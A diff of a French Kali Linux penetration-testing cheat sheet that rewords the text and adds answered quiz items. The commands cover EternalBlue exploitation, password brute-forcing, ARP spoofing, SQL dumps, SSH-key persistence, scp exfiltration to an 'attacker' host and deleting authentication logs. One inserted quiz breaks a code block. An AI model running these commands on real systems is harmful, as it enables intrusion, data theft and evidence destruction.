@@ -1,6 +1,6 @@
 ---
-title: 'Fiche Mémo Kali Linux'
-description: 'Maîtrisez Kali Linux avec notre fiche mémo complète couvrant les commandes essentielles, les concepts et les meilleures pratiques.'
+title: 'Fiche Mémo Kali Linux | LabEx'
+description: "Apprenez les tests d'intrusion Kali Linux avec cette fiche mémo complète. Référence rapide pour les outils de sécurité, le hacking éthique, l'analyse de vulnérabilités, l'exploitation et les tests de cybersécurité."
 pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 ---
 
@@ -12,10 +12,10 @@ Feuille de triche Kali Linux
 
 <base-disclaimer>
 <base-disclaimer-title>
-<a target="_blank" href="https://labex.io/fr/learn/kali">Apprenez Kali Linux avec des Labs Pratiques</a>
+<a target="_blank" href="https://labex.io/fr/learn/kali">Apprenez Kali Linux avec des laboratoires pratiques</a>
 </base-disclaimer-title>
 <base-disclaimer-content>
-Apprenez les tests d'intrusion Kali Linux grâce à des laboratoires pratiques et des scénarios du monde réel. LabEx propose des cours complets sur Kali Linux couvrant les commandes essentielles, la numérisation de réseau, l'évaluation des vulnérabilités, les attaques par mot de passe, les tests d'applications web et la criminalistique numérique. Maîtrisez les techniques de hacking éthique et les outils d'audit de sécurité.
+Apprenez les tests d'intrusion Kali Linux grâce à des laboratoires pratiques et des scénarios réels. LabEx propose des cours complets sur Kali Linux couvrant les commandes essentielles, la numérisation de réseau, l'évaluation des vulnérabilités, les attaques par mot de passe, les tests d'applications Web et la criminalistique numérique. Maîtrisez les techniques de piratage éthique et les outils d'audit de sécurité.
 </base-disclaimer-content>
 </base-disclaimer>
 
@@ -23,7 +23,7 @@ Apprenez les tests d'intrusion Kali Linux grâce à des laboratoires pratiques e
 
 ### Configuration Initiale : `sudo apt update`
 
-Mettre à jour les paquets et les dépôts système pour des performances optimales.
+Mettre à jour les paquets et les dépôts du système pour des performances optimales.
 
 ```bash
 # Mettre à jour le dépôt de paquets
@@ -90,9 +90,24 @@ Configurer les variables d'environnement et les chemins du système de test.
 export TARGET=192.168.1.1
 # Définir le chemin de la liste de mots
 export WORDLIST=/usr/share/wordlists/rockyou.txt
-# Voir les variables d'environnement
+# Afficher les variables d'environnement
 env | grep TARGET
 ```
+
+<BaseQuiz id="kali-env-1" correct="C">
+  <template #question>
+    Que se passe-t-il avec les variables d'environnement définies avec `export` ?
+  </template>
+  
+  <BaseQuizOption value="A">Elles persistent après les redémarrages du système</BaseQuizOption>
+  <BaseQuizOption value="B">Elles ne sont disponibles que dans le fichier actuel</BaseQuizOption>
+  <BaseQuizOption value="C" correct>Elles sont disponibles pour le shell actuel et les processus enfants</BaseQuizOption>
+  <BaseQuizOption value="D">Ce sont des variables système globales</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Les variables d'environnement définies avec `export` sont disponibles pour la session shell actuelle et tous les processus enfants qui en sont issus. Elles sont perdues lorsque la session shell se termine, sauf si elles sont ajoutées aux fichiers de configuration du shell comme `.bashrc`.
+  </BaseQuizAnswer>
+</BaseQuiz>
 
 ### Installation d'Outils : `apt install`
 
@@ -107,7 +122,7 @@ git clone https://github.com/tool/repo.git
 pip3 install --user tool-name
 ```
 
-## Découverte et Balayage Réseau
+## Découverte et Numérisation de Réseau
 
 ### Découverte d'Hôtes : `nmap -sn`
 
@@ -124,9 +139,9 @@ nmap -PE 192.168.1.0/24
 masscan --ping 192.168.1.0/24
 ```
 
-### Balayage de Ports : `nmap`
+### Numérisation de Ports : `nmap`
 
-Scanner les ports ouverts et les services en cours d'exécution sur les systèmes cibles.
+Analyser les ports ouverts et les services en cours d'exécution sur les systèmes cibles.
 
 ```bash
 # Balayage TCP de base
@@ -139,6 +154,21 @@ nmap -sU 192.168.1.1
 nmap -sS 192.168.1.1
 ```
 
+<BaseQuiz id="kali-nmap-1" correct="B">
+  <template #question>
+    Que fait `nmap -sS` ?
+  </template>
+  
+  <BaseQuizOption value="A">Effectue un balayage UDP</BaseQuizOption>
+  <BaseQuizOption value="B" correct>Effectue un balayage SYN furtif (balayage demi-ouvert)</BaseQuizOption>
+  <BaseQuizOption value="C">Analyse tous les ports</BaseQuizOption>
+  <BaseQuizOption value="D">Effectue la détection du système d'exploitation</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Le drapeau `-sS` effectue un balayage SYN (également appelé balayage demi-ouvert) car il ne complète jamais la poignée de main TCP. Il envoie des paquets SYN et analyse les réponses, ce qui le rend plus furtif qu'un balayage de connexion TCP complet.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### Énumération de Services : `nmap -sV`
 
 Identifier les versions de services et les vulnérabilités potentielles.
@@ -146,8 +176,24 @@ Identifier les versions de services et les vulnérabilités potentielles.
 ```bash
 # Détection de version
 nmap -sV 192.168.1.1
-# Détection d'OS
+# Détection du système d'exploitation
 nmap -O 192.168.1.1
+```
+
+<BaseQuiz id="kali-enumeration-1" correct="A">
+  <template #question>
+    Que fait `nmap -sV` ?
+  </template>
+  
+  <BaseQuizOption value="A" correct>Détecte les versions de services s'exécutant sur les ports ouverts</BaseQuizOption>
+  <BaseQuizOption value="B">Analyse uniquement les ports de contrôle de version</BaseQuizOption>
+  <BaseQuizOption value="C">Affiche uniquement les services vulnérables</BaseQuizOption>
+  <BaseQuizOption value="D">Effectue uniquement la détection du système d'exploitation</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Le drapeau `-sV` active la détection de version, qui sonde les ports ouverts pour déterminer quel service et quelle version sont en cours d'exécution. Ceci est utile pour identifier les vulnérabilités potentielles associées à des versions logicielles spécifiques.
+  </BaseQuizAnswer>
+</BaseQuiz>
 # Balayage de scripts
 nmap -sC 192.168.1.1
 # Balayage complet
@@ -173,7 +219,7 @@ dnsrecon -d example.com
 
 ### Reconnaissance Web : `dirb`
 
-Découvrir des répertoires et des fichiers cachés sur les serveurs web.
+Découvrir les répertoires et fichiers cachés sur les serveurs Web.
 
 ```bash
 # Force brute de répertoires
@@ -199,7 +245,7 @@ theharvester -d example.com -l 100 -b google
 
 ### Analyse SSL/TLS : `sslscan`
 
-Analyser la configuration SSL/TLS et les vulnérabilités.
+Analyser la configuration et les vulnérabilités SSL/TLS.
 
 ```bash
 # Balayage SSL
@@ -221,7 +267,7 @@ enum4linux 192.168.1.1
 smbclient -L //192.168.1.1
 # Se connecter au partage
 smbclient //192.168.1.1/share
-# Balayage de vulnérabilités SMB
+# Balayage de vulnérabilité SMB
 nmap --script smb-vuln* 192.168.1.1
 ```
 
@@ -240,24 +286,24 @@ snmp-check 192.168.1.1
 
 ## Analyse des Vulnérabilités et Exploitation
 
-### Balayage de Vulnérabilités : `nessus`
+### Analyse des Vulnérabilités : `nessus`
 
 Identifier les vulnérabilités de sécurité à l'aide de scanners automatisés.
 
 ```bash
 # Démarrer le service Nessus
 sudo systemctl start nessusd
-# Lancer le scan OpenVAS
+# Démarrer le scan OpenVAS
 openvas-start
-# Scanner de vulnérabilités web Nikto
+# Scanner de vulnérabilités Web Nikto
 nikto -h http://192.168.1.1
 # SQLmap pour l'injection SQL
 sqlmap -u "http://example.com/page.php?id=1"
 ```
 
-### Metasploit Framework : `msfconsole`
+### Framework Metasploit : `msfconsole`
 
-Lancer des exploits et gérer des campagnes de tests d'intrusion.
+Lancer des exploits et gérer les campagnes de tests d'intrusion.
 
 ```bash
 # Démarrer Metasploit
@@ -266,7 +312,7 @@ msfconsole
 search ms17-010
 # Utiliser l'exploit
 use exploit/windows/smb/ms17_010_eternalblue
-# Définir l'hôte cible
+# Définir l'hôte distant
 set RHOSTS 192.168.1.1
 ```
 
@@ -309,7 +355,7 @@ hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USE
 hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 ```
 
-### Crackage de Hachages : `hashcat`
+### Crackage de Hachage : `hashcat`
 
 Craquer des hachages de mots de passe à l'aide de l'accélération GPU.
 
@@ -327,11 +373,11 @@ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
 Crackage de mots de passe traditionnel avec divers modes d'attaque.
 
 ```bash
-# Craquer le fichier de mots de passe
+# Craquer le fichier de mot de passe
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
 # Afficher les mots de passe craqués
 john --show shadow.txt
-# Mode incrémental
+# Mode incrémentiel
 john --incremental shadow.txt
 # Règles personnalisées
 john --rules --wordlist=passwords.txt shadow.txt
@@ -370,7 +416,7 @@ sudo airmon-ng stop wlan0mon
 Découvrir et surveiller les réseaux sans fil et les clients.
 
 ```bash
-# Scanner tous les réseaux
+# Balayer tous les réseaux
 sudo airodump-ng wlan0mon
 # Cibler un réseau spécifique
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
@@ -406,7 +452,7 @@ ettercap -T -M arp:remote /192.168.1.0/24//
 
 ## Tests de Sécurité des Applications Web
 
-### Test d'Injection SQL : `sqlmap`
+### Tests d'Injection SQL : `sqlmap`
 
 Détection et exploitation automatisées des injections SQL.
 
@@ -421,9 +467,9 @@ sqlmap -u "http://example.com/page.php?id=1" --dbs
 sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
 ```
 
-### Cross-Site Scripting : `xsser`
+### Scripting Inter-Sites (XSS) : `xsser`
 
-Tester les vulnérabilités XSS dans les applications web.
+Tester les vulnérabilités XSS dans les applications Web.
 
 ```bash
 # Test XSS
@@ -436,13 +482,13 @@ xsser --url "http://example.com" --payload="<script>alert(1)</script>"
 
 ### Intégration Burp Suite : `burpsuite`
 
-Plateforme complète de tests de sécurité des applications web.
+Plateforme complète de tests de sécurité des applications Web.
 
 ```bash
 # Démarrer Burp Suite
 burpsuite
 # Configurer le proxy (127.0.0.1:8080)
-# Configurer le navigateur proxy pour capturer le trafic
+# Configurer le proxy du navigateur pour capturer le trafic
 # Utiliser Intruder pour les attaques automatisées
 # Spider pour la découverte de contenu
 ```
@@ -489,7 +535,7 @@ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 
 ### Exfiltration de Données : `scp`
 
-Transférer des données de manière sécurisée depuis des systèmes compromis.
+Transférer des données en toute sécurité depuis des systèmes compromis.
 
 ```bash
 # Copier un fichier vers la machine de l'attaquant
@@ -501,7 +547,7 @@ scp data.tar.gz attacker@192.168.1.100:/tmp/
 python3 -m http.server 8000
 ```
 
-### Couvrir ses Traces : `history`
+### Couvrir les Traces : `history`
 
 Supprimer les preuves des activités sur les systèmes compromis.
 
@@ -519,7 +565,7 @@ sudo rm /var/log/auth.log*
 
 ### Imagerie de Disque : `dd`
 
-Créer des images forensiques des périphériques de stockage.
+Créer des images forensiques de périphériques de stockage.
 
 ```bash
 # Créer une image disque
@@ -534,7 +580,7 @@ sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
 
 ### Récupération de Fichiers : `foremost`
 
-Récupérer des fichiers supprimés à partir d'images disque ou de lecteurs.
+Récupérer les fichiers supprimés à partir d'images disque ou de lecteurs.
 
 ```bash
 # Récupérer des fichiers à partir de l'image
@@ -547,14 +593,14 @@ photorec evidence.img
 
 ### Analyse de Mémoire : `volatility`
 
-Analyser les vidages de RAM pour des preuves forensiques.
+Analyser les vidages de RAM pour obtenir des preuves forensiques.
 
 ```bash
 # Identifier le profil OS
 volatility -f memory.dump imageinfo
 # Lister les processus
 volatility -f memory.dump --profile=Win7SP1x64 pslist
-# Extraire un processus
+# Extraire le processus
 volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
 ```
 
@@ -573,7 +619,7 @@ foremost -i capture.pcap -o extracted/
 
 ## Génération de Rapports et Documentation
 
-### Capture d'Écran : `gnome-screenshot`
+### Capture de Capture d'Écran : `gnome-screenshot`
 
 Documenter les découvertes avec une capture d'écran systématique.
 
@@ -582,7 +628,7 @@ Documenter les découvertes avec une capture d'écran systématique.
 gnome-screenshot -f screenshot.png
 # Capture de fenêtre
 gnome-screenshot -w -f window.png
-# Capture différée
+# Capture retardée
 gnome-screenshot -d 5 -f delayed.png
 # Sélection de zone
 gnome-screenshot -a -f area.png
@@ -653,7 +699,7 @@ Surveiller et mettre à jour le noyau du système pour les correctifs de sécuri
 uname -r
 # Lister les noyaux disponibles
 apt list --upgradable | grep linux-image
-# Installer un nouveau noyau
+# Installer le nouveau noyau
 sudo apt install linux-image-generic
 # Supprimer les anciens noyaux
 sudo apt autoremove --purge
@@ -664,7 +710,7 @@ sudo apt autoremove --purge
 Vérifier les installations d'outils et localiser les exécutables.
 
 ```bash
-# Localiser un outil
+# Localiser l'outil
 which nmap
 # Vérifier si l'outil existe
 command -v metasploit
@@ -674,7 +720,7 @@ ls /usr/bin/ | grep -i security
 
 ### Surveillance des Ressources : `htop`
 
-Surveiller les ressources système lors de tests de sécurité intensifs.
+Surveiller les ressources système pendant les tests de sécurité intensifs.
 
 ```bash
 # Visionneuse de processus interactive
@@ -694,7 +740,7 @@ netstat -tulnp
 Configurer des raccourcis de commande pour gagner du temps lors des tâches fréquentes.
 
 ```bash
-# Modifier bashrc
+# Éditer bashrc
 nano ~/.bashrc
 # Ajouter des alias utiles
 alias ll='ls -la'
@@ -714,7 +760,7 @@ Créer des combinaisons de commandes avancées pour les flux de travail courants
 function qscan() {
     nmap -sS -sV -O $1
 }
-# Configuration de la configuration des tests d'intrusion
+# Configuration de la configuration de pentest
 function pentest-setup() {
     mkdir -p {recon,scans,exploits,loot}
 }
